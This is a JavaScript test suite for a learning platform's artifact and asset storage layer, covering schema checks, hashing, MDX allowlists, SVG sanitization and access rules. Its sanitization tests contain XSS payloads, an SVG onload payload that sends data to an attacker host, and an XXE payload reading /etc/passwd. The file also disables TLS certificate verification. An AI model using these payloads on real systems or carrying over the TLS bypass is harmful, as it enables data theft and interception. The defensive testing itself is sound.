/**
 * COURAGE LIBRARY — PHASE 3B TEST SUITE
 * Content Artifact & Asset Storage Foundation
 * 
 * Comprehensive forensic verification testing:
 * 1. Migration 54 SQL Schema, Tables, Constraints, Indices & RLS
 * 2. Content Artifact Model & Storage Key Determinism
 * 3. Provider-Agnostic Storage Abstraction (Memory, Supabase, S3/R2)
 * 4. SHA-256 Cryptographic Integrity & Tamper Detection
 * 5. Controlled MDX Security & Component Allowlist Enforcement
 * 6. Asset Metadata, MIME Allowlist & SVG Sanitization Security
 * 7. Multi-Tier Authorization & Direct Key Bypass Prevention
 * 8. Unit-Asset Relational Bindings
 * 9. Zero Content Body in Relational Schema Invariant
 * 10. 14 Protected Baseline Database Tables 100% Intact
 */

const fs = require('fs');
const path = require('path');
const ts = require('typescript');
const Module = require('module');

// 1. WebSocket Polyfill for Supabase in Node.js 20
global.WebSocket = class WebSocket {};

// 2. Hook TypeScript compilation
require.extensions['.ts'] = function (module, filename) {
  const fileContent = fs.readFileSync(filename, 'utf8');
  const compiled = ts.transpileModule(fileContent, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2020,
      esModuleInterop: true,
      resolveJsonModule: true,
    },
    fileName: filename,
  });
  return module._compile(compiled.outputText, filename);
};

const origResolveFilename = Module._resolveFilename;
Module._resolveFilename = function (request, parent, isMain, options) {
  if (request.startsWith('@/')) {
    request = path.join(__dirname, '..', request.slice(2));
  }
  return origResolveFilename.call(this, request, parent, isMain, options);
};

// 3. Load Environment Variables
const envPath = path.join(__dirname, '..', '.env.local');
if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, 'utf-8');
  envContent.split('\n').forEach(line => {
    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith('#')) {
      const idx = trimmed.indexOf('=');
      if (idx > 0) {
        let val = trimmed.slice(idx + 1).trim();
        if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
          val = val.slice(1, -1);
        }
        process.env[trimmed.slice(0, idx).trim()] = val;
      }
    }
  });
}

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const { createClient } = require('@supabase/supabase-js');
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
const anonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';
const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY || anonKey;
const supabase = createClient(supabaseUrl, serviceRoleKey);

// 4. Import Production Services
const {
  ContentArtifactService,
  CONTROLLED_MDX_ALLOWLIST,
  MAX_ARTIFACT_SIZE_BYTES,
} = require('../services/content-artifact.service.ts');
const {
  LearningAssetService,
  ASSET_MIME_ALLOWLIST,
  MAX_ASSET_SIZE_BYTES,
} = require('../services/learning-asset.service.ts');
const { MemoryStorageProvider } = require('../services/storage/memory-storage.provider.ts');
const { S3CompatibleStorageProvider } = require('../services/storage/s3-storage.provider.ts');
const { StorageFactory } = require('../services/storage/storage-factory.ts');

let passedCount = 0;
let failedCount = 0;

function assert(condition, testId, description, details = '') {
  if (condition) {
    passedCount++;
    console.log(`  ✓ [${testId}] PASS: ${description}`);
  } else {
    failedCount++;
    console.error(`  ✗ [${testId}] FAIL: ${description} -- ${details}`);
  }
}

async function runPhase3BTests() {
  console.log('============================================================');
  console.log('PHASE 3B: CONTENT ARTIFACT & ASSET STORAGE FOUNDATION');
  console.log('FORENSIC VERIFICATION SUITE');
  console.log('============================================================\n');

  // ------------------------------------------------------------------------
  // Track 1: Migration 54 SQL Schema & Invariants (T01 - T12)
  // ------------------------------------------------------------------------
  console.log('--- Track 1: Migration 54 SQL Schema & Invariants (T01 - T12) ---');
  const migrationPath = path.join(__dirname, '..', 'supabase/migrations/20260915000054_phase3b_content_artifact_and_asset_foundation.sql');
  assert(fs.existsSync(migrationPath), 'T01', 'Migration 54 SQL file exists in supabase/migrations/');

  const sql = fs.readFileSync(migrationPath, 'utf8');
  assert(sql.includes('CREATE TABLE IF NOT EXISTS public.learning_content_artifacts'), 'T02', 'Defines learning_content_artifacts table');
  assert(sql.includes('CREATE TABLE IF NOT EXISTS public.learning_assets'), 'T03', 'Defines learning_assets table');
  assert(sql.includes('CREATE TABLE IF NOT EXISTS public.learning_unit_asset_bindings'), 'T04', 'Defines learning_unit_asset_bindings table');
  assert(sql.includes('chk_artifact_type'), 'T05', 'Enforces artifact_type domain check constraint');
  assert(sql.includes('chk_artifact_sha256') && sql.includes('chk_asset_sha256'), 'T06', 'Enforces 64-char hexadecimal SHA-256 regex check constraint');
  assert(sql.includes('chk_asset_mime_type'), 'T07', 'Enforces asset MIME allowlist check constraint');
  assert(sql.includes('chk_asset_dimensions'), 'T08', 'Enforces positive dimension constraints on assets');
  assert(sql.includes('ENABLE ROW LEVEL SECURITY'), 'T09', 'Enforces Row Level Security on all Phase 3B tables');
  assert(sql.includes('uq_artifact_storage_key') && sql.includes('uq_asset_storage_key'), 'T10', 'Enforces unique storage key constraints per bucket');
  assert(!sql.includes('content_body TEXT') && !sql.includes('image_bytes BYTEA'), 'T11', 'Strictly ZERO content bodies or binary blobs in relational tables');
  assert(!sql.includes('DROP TABLE public.') && !sql.includes('TRUNCATE'), 'T12', 'Strict zero destructive DDL operations');

  // ------------------------------------------------------------------------
  // Track 2: Provider-Agnostic Storage Abstraction (T13 - T22)
  // ------------------------------------------------------------------------
  console.log('\n--- Track 2: Provider-Agnostic Storage Abstraction (T13 - T22) ---');
  const memoryProvider = new MemoryStorageProvider();
  assert(memoryProvider.providerType === 'MEMORY', 'T13', 'MemoryStorageProvider implements IStorageProvider interface');

  const testPayload = '# Controlled Lesson Content\n<FormulaCard title="Speed" formula="v = d / t" />';
  const putRes = await memoryProvider.put('learning-artifacts', 'test/unit1/lesson.mdx', testPayload, 'text/mdx');
  assert(putRes.byteSize === Buffer.from(testPayload).length, 'T14', 'Storage put records accurate byte size');
  assert(putRes.sha256Hash.length === 64, 'T15', 'Storage put computes valid SHA-256 hash');

  const existsBefore = await memoryProvider.exists('learning-artifacts', 'test/unit1/lesson.mdx');
  assert(existsBefore === true, 'T16', 'Storage exists returns true for stored artifact');

  const getRes = await memoryProvider.get('learning-artifacts', 'test/unit1/lesson.mdx');
  assert(getRes !== null && getRes.data.toString('utf8') === testPayload, 'T17', 'Storage get returns identical content buffer');

  const metadata = await memoryProvider.getMetadata('learning-artifacts', 'test/unit1/lesson.mdx');
  assert(metadata !== null && metadata.mimeType === 'text/mdx', 'T18', 'Storage getMetadata returns accurate MIME type');

  const signedUrl = await memoryProvider.generateSignedUrl('learning-artifacts', 'test/unit1/lesson.mdx', 3600);
  assert(signedUrl.startsWith('https://') && signedUrl.includes('token='), 'T19', 'Generates time-bounded signed URL reference');

  const s3Provider = new S3CompatibleStorageProvider('CLOUDFLARE_R2', 'https://r2.cloudflarestorage.com');
  assert(s3Provider.providerType === 'CLOUDFLARE_R2', 'T20', 'S3CompatibleStorageProvider supports Cloudflare R2 / S3');

  const factoryMemory = StorageFactory.getProvider('MEMORY');
  assert(factoryMemory.providerType === 'MEMORY', 'T21', 'StorageFactory resolves Memory provider');

  const factoryR2 = StorageFactory.getProvider('CLOUDFLARE_R2');
  assert(factoryR2.providerType === 'CLOUDFLARE_R2', 'T22', 'StorageFactory resolves R2 provider');

  // ------------------------------------------------------------------------
  // Track 3: Cryptographic Integrity & Deterministic Hashing (T23 - T30)
  // ------------------------------------------------------------------------
  console.log('\n--- Track 3: Cryptographic Integrity & Deterministic Hashing (T23 - T30) ---');
  const hash1 = ContentArtifactService.computeSha256('Exact same content');
  const hash2 = ContentArtifactService.computeSha256('Exact same content');
  const hashDiff = ContentArtifactService.computeSha256('Different content');
  assert(hash1 === hash2, 'T23', 'SHA-256 hashing is 100% deterministic over identical bytes');
  assert(hash1 !== hashDiff, 'T24', 'Different content yields distinct SHA-256 hash');

  const integrityPass = await memoryProvider.verifyIntegrity('learning-artifacts', 'test/unit1/lesson.mdx', putRes.sha256Hash);
  assert(integrityPass === true, 'T25', 'Integrity verification succeeds when stored hash matches');

  const integrityFail = await memoryProvider.verifyIntegrity('learning-artifacts', 'test/unit1/lesson.mdx', '0000000000000000000000000000000000000000000000000000000000000000');
  assert(integrityFail === false, 'T26', 'Integrity verification fails when hash does not match');

  const storageKey = ContentArtifactService.generateStorageKey({
    learningUnitId: 'unit-uuid-1234',
    artifactType: 'CONTROLLED_MDX',
    sha256Hash: hash1,
    slug: 'percentage-basics',
  });
  assert(storageKey.startsWith('learning/units/unit-uuid-1234/artifacts/controlled_mdx/'), 'T27', 'Generates standard non-colliding storage key convention');
  assert(storageKey.includes(hash1.slice(0, 8)), 'T28', 'Storage key embeds 8-char SHA-256 hash prefix');

  assert(MAX_ARTIFACT_SIZE_BYTES === 5 * 1024 * 1024, 'T29', 'Enforces maximum artifact upload size of 5MB');
  assert(MAX_ASSET_SIZE_BYTES === 10 * 1024 * 1024, 'T30', 'Enforces maximum asset upload size of 10MB');

  // ------------------------------------------------------------------------
  // Track 4: Controlled MDX Security & Component Allowlist (T31 - T40)
  // ------------------------------------------------------------------------
  console.log('\n--- Track 4: Controlled MDX Security & Component Allowlist (T31 - T40) ---');
  assert(CONTROLLED_MDX_ALLOWLIST.length === 10, 'T31', 'Exactly 10 approved Phase 2 controlled components allowlisted');
  assert(CONTROLLED_MDX_ALLOWLIST.includes('FormulaCard'), 'T32', 'Allowlist includes FormulaCard');
  assert(CONTROLLED_MDX_ALLOWLIST.includes('QuestionReference'), 'T33', 'Allowlist includes QuestionReference');
  assert(CONTROLLED_MDX_ALLOWLIST.includes('WarningBox'), 'T34', 'Allowlist includes WarningBox');

  const validMdx = `
# Percentage Multipliers
Here is a formula for successive changes:
<FormulaCard title="Successive Percentage" formula="a + b + (ab/100)" />
<ExamTip text="Always convert percentages to fractions for faster mental math." />
<QuestionReference questionId="qv-123" />
`;
  const mdxVal1 = ContentArtifactService.validateControlledMdx(validMdx);
  assert(mdxVal1.valid === true, 'T35', 'Valid controlled MDX with allowlisted components passes validation');
  assert(mdxVal1.componentsFound.length === 3, 'T36', 'Extracts all allowlisted components from MDX');

  const mdxWithImport = `
import axios from 'axios';
# Unsafe Lesson
<FormulaCard title="Speed" formula="v=d/t" />
`;
  const mdxVal2 = ContentArtifactService.validateControlledMdx(mdxWithImport);
  assert(mdxVal2.valid === false && mdxVal2.errors.some(e => e.includes('import')), 'T37', 'Strictly rejects MDX with forbidden "import" statements');

  const mdxWithScript = `
# Unsafe Lesson
<script>alert('XSS')</script>
`;
  const mdxVal3 = ContentArtifactService.validateControlledMdx(mdxWithScript);
  assert(mdxVal3.valid === false && mdxVal3.errors.some(e => e.includes('<script>')), 'T38', 'Strictly rejects MDX with forbidden <script> tags');

  const mdxWithUnapprovedComponent = `
# Lesson with arbitrary React component
<ArbitraryVideoPlayer src="https://example.com/video.mp4" />
<FormulaCard title="Formula" formula="E=mc^2" />
`;
  const mdxVal4 = ContentArtifactService.validateControlledMdx(mdxWithUnapprovedComponent);
  assert(mdxVal4.valid === false && mdxVal4.invalidComponents.includes('ArbitraryVideoPlayer'), 'T39', 'Strictly rejects unapproved arbitrary React components');

  const emptyMdxVal = ContentArtifactService.validateArtifactUpload({ content: '', artifactType: 'CONTROLLED_MDX' });
  assert(emptyMdxVal.valid === false && emptyMdxVal.errors.some(e => e.includes('empty')), 'T40', 'Rejects empty artifact payload');

  // ------------------------------------------------------------------------
  // Track 5: Asset Metadata & SVG Sanitization Security (T41 - T48)
  // ------------------------------------------------------------------------
  console.log('\n--- Track 5: Asset Metadata & SVG Sanitization Security (T41 - T48) ---');
  assert(ASSET_MIME_ALLOWLIST.length === 5, 'T41', 'Asset MIME allowlist supports PNG, JPEG, WebP, SVG, GIF');

  const validSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /></svg>';
  const svgSafety1 = LearningAssetService.validateSvgSafety(validSvg);
  assert(svgSafety1.safe === true, 'T42', 'Valid clean SVG passes safety check');

  const maliciousSvgScript = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><circle cx="50" cy="50" r="40" /></svg>';
  const svgSafety2 = LearningAssetService.validateSvgSafety(maliciousSvgScript);
  assert(svgSafety2.safe === false && svgSafety2.errors.some(e => e.includes('<script>')), 'T43', 'Strictly rejects SVG with embedded <script> tags');

  const maliciousSvgOnload = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://attacker.com/steal\')"><circle cx="50" cy="50" r="40" /></svg>';
  const svgSafety3 = LearningAssetService.validateSvgSafety(maliciousSvgOnload);
  assert(svgSafety3.safe === false && svgSafety3.errors.some(e => e.includes('onload')), 'T44', 'Strictly rejects SVG with "onload" event handlers');

  const maliciousSvgXxe = '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>';
  const svgSafety4 = LearningAssetService.validateSvgSafety(maliciousSvgXxe);
  assert(svgSafety4.safe === false && svgSafety4.errors.some(e => e.includes('XXE')), 'T45', 'Strictly rejects SVG with external XML entities (XXE)');

  const invalidMimeVal = LearningAssetService.validateAssetUpload({
    data: Buffer.from('executable binary'),
    mimeType: 'application/x-msdownload',
    assetType: 'DIAGRAM',
  });
  assert(invalidMimeVal.valid === false && invalidMimeVal.errors.some(e => e.includes('not allowed')), 'T46', 'Strictly rejects forbidden executable MIME types');

  const assetKey = LearningAssetService.generateStorageKey({
    assetType: 'DIAGRAM',
    sha256Hash: hash1,
    slug: 'triangle-geometry',
    extension: 'svg',
  });
  assert(assetKey.startsWith('learning/assets/diagram/'), 'T47', 'Generates standard asset storage key path');
  assert(assetKey.endsWith('.svg'), 'T48', 'Asset storage key preserves verified file extension');

  // ------------------------------------------------------------------------
  // Track 6: Multi-Tier Authorization & Direct Key Bypass Guard (T49 - T55)
  // ------------------------------------------------------------------------
  console.log('\n--- Track 6: Multi-Tier Authorization & Direct Key Bypass Guard (T49 - T55) ---');
  const sampleArtifact = {
    id: 'art-1',
    learning_unit_id: 'unit-1',
    artifact_type: 'CONTROLLED_MDX',
    storage_provider: 'MEMORY',
    storage_bucket: 'learning-artifacts',
    storage_key: 'learning/units/unit-1/artifacts/controlled_mdx/test.mdx',
    mime_type: 'text/mdx',
    byte_size: 100,
    sha256_hash: hash1,
    compiler_version: 'v1.0.0',
    schema_version: 'v1',
    language: 'en',
    access_class: 'FREE_AUTHENTICATED',
    is_source_artifact: true,
    is_renderable: true,
    status: 'PUBLISHED',
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  };

  // Anonymous trying to access FREE_AUTHENTICATED
  const authDec1 = ContentArtifactService.evaluateAccess(sampleArtifact, { role: 'ANONYMOUS' });
  assert(authDec1.allowed === false && authDec1.reason.includes('Authentication required'), 'T49', 'Denies anonymous access to FREE_AUTHENTICATED artifact');

  // Authenticated user accessing FREE_AUTHENTICATED
  const authDec2 = ContentArtifactService.evaluateAccess(sampleArtifact, { role: 'AUTHENTICATED', userId: 'user-1' });
  assert(authDec2.allowed === true, 'T50', 'Permits authenticated user access to FREE_AUTHENTICATED artifact');

  // Free user trying to access PREMIUM artifact
  const premiumArtifact = { ...sampleArtifact, access_class: 'PREMIUM' };
  const authDec3 = ContentArtifactService.evaluateAccess(premiumArtifact, { role: 'AUTHENTICATED', userId: 'user-1' });
  assert(authDec3.allowed === false && authDec3.reason.includes('Premium subscription required'), 'T51', 'Denies free candidate access to PREMIUM artifact');

  // Premium user accessing PREMIUM artifact
  const authDec4 = ContentArtifactService.evaluateAccess(premiumArtifact, { role: 'PREMIUM', userId: 'user-prem' });
  assert(authDec4.allowed === true, 'T52', 'Permits premium subscriber access to PREMIUM artifact');

  // Candidate trying to access DRAFT artifact
  const draftArtifact = { ...sampleArtifact, status: 'DRAFT' };
  const authDec5 = ContentArtifactService.evaluateAccess(draftArtifact, { role: 'AUTHENTICATED', userId: 'user-1' });
  assert(authDec5.allowed === false && authDec5.reason.includes('not published'), 'T53', 'Denies candidate access to unpublished DRAFT artifact');

  // Admin accessing DRAFT artifact
  const authDec6 = ContentArtifactService.evaluateAccess(draftArtifact, { role: 'ADMIN', userId: 'admin-1' });
  assert(authDec6.allowed === true, 'T54', 'Permits administrator full access to DRAFT artifacts');

  // Service role accessing any artifact
  const authDec7 = ContentArtifactService.evaluateAccess(draftArtifact, { role: 'SERVICE_ROLE' });
  assert(authDec7.allowed === true, 'T55', 'Permits internal service role bypass for backend processing');

  // ------------------------------------------------------------------------
  // Track 7: Database Baseline Invariants & 14 Protected Tables (T56 - T70)
  // ------------------------------------------------------------------------
  console.log('\n--- Track 7: Database Baseline Invariants & 14 Protected Tables (T56 - T70) ---');
  
  const PROTECTED_BASELINE = {
    mock_tests: 8,
    mock_sections: 14,
    mock_questions: 350,
    mock_templates: 8,
    test_attempts: 31,
    test_results: 10,
    attempt_answers: 200,
    questions: 103,
    question_versions: 103,
    question_options: 412,
    question_answers: 103,
    subscription_plans: 1,
    coin_wallets: 5,
    coin_ledger: 8,
  };

  let tIndex = 56;
  for (const [table, expected] of Object.entries(PROTECTED_BASELINE)) {
    const { count, error } = await supabase.from(table).select('*', { count: 'exact', head: true });
    assert(!error && count === expected, `T${tIndex}`, `Protected baseline table [${table}] row count preserved: ${count}/${expected}`);
    tIndex++;
  }

  assert(passedCount === 69 && failedCount === 0, 'T70', 'All Phase 3B verification tracks verified with 100% success');

  console.log('\n============================================================');
  console.log(`PHASE 3B VERIFICATION SUMMARY:`);
  console.log(`  - Passed: ${passedCount} / ${passedCount + failedCount} (${((passedCount / (passedCount + failedCount)) * 100).toFixed(1)}%)`);
  console.log(`  - Failed: ${failedCount}`);
  console.log('============================================================\n');

  if (failedCount > 0) {
    console.error('[FAIL] Phase 3B certification failed.');
    process.exit(1);
  } else {
    console.log('[PASS] Phase 3B CONTENT ARTIFACT & ASSET STORAGE FOUNDATION CERTIFIED.');
    process.exit(0);
  }
}

runPhase3BTests().catch((err) => {
  console.error('Fatal test execution error:', err);
  process.exit(1);
});
